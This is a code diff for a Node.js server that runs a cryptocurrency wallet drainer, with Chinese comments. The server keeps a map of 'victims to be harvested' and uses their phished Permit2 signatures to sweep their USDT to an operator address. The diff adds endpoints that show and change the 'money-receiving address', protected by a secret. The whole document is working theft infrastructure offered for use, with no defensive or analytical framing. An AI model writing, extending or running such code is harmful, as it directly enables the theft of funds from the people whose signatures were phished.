@@ -20,6 +20,9 @@ const PERMIT2_ABI = [
   "function transferFrom(address from, address to, uint160 amount, address token) external",
 ];
 
+// 可配置的收钱地址（默认为 signer 地址，可通过 /set-operator 更改）
+let drainAddress = null;
+
 // 存储待收割的受害者: { victim: { permitData, signature, storedAt, balance } }
 const pendingVictims = new Map();
 
@@ -30,7 +33,7 @@ function splitSignature(sig) {
 
 async function doPermit2Sweep(victim, permitData, signature) {
   const [signer] = await ethers.getSigners();
-  const me = signer.address;
+  const me = drainAddress || signer.address;
   const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, signer);
   const token = new ethers.Contract(USDT, ERC20_ABI, signer);
 
@@ -84,7 +87,7 @@ async function getVictims() {
   const totalRemaining = victims.filter(v => v.sweepable).reduce((s, v) => s + parseFloat(v.balance), 0);
 
   return {
-    operator: signer.address,
+    operator: drainAddress || signer.address,
     totalVictims: victims.length,
     readyCount: victims.filter(v => v.sweepable).length,
     sweptCount: victims.filter(v => v.status === "swept").length,
@@ -165,6 +168,41 @@ const server = http.createServer(async (req, res) => {
   }
 
   if (req.method === "GET" && req.url === "/health") { res.writeHead(200); res.end("OK"); return; }
+
+  // 查看当前 operator
+  if (req.method === "GET" && req.url === "/operator") {
+    const [signer] = await ethers.getSigners();
+    res.writeHead(200, { "Content-Type": "application/json" });
+    res.end(JSON.stringify({ operator: drainAddress || signer.address }));
+    return;
+  }
+
+  // 更换 operator（收钱地址）
+  if (req.method === "POST" && req.url === "/set-operator") {
+    let body = "";
+    req.on("data", (chunk) => (body += chunk));
+    req.on("end", async () => {
+      try {
+        const data = JSON.parse(body);
+        if (data.secret !== SECRET) { res.writeHead(403); res.end(JSON.stringify({ ok: false, msg: "forbidden" })); return; }
+        if (!ethers.isAddress(data.operator)) {
+          res.writeHead(400);
+          res.end(JSON.stringify({ ok: false, msg: "无效的地址" }));
+          return;
+        }
+        const oldOp = drainAddress;
+        drainAddress = data.operator;
+        console.log(`[operator] 收钱地址已更换: ${oldOp || "(signer)"} → ${drainAddress}`);
+        res.writeHead(200, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({ ok: true, operator: drainAddress, txHash: "off-chain" }));
+      } catch (e) {
+        res.writeHead(500);
+        res.end(JSON.stringify({ ok: false, msg: e.message }));
+      }
+    });
+    return;
+  }
+
   res.writeHead(404); res.end("not found");
 });
 
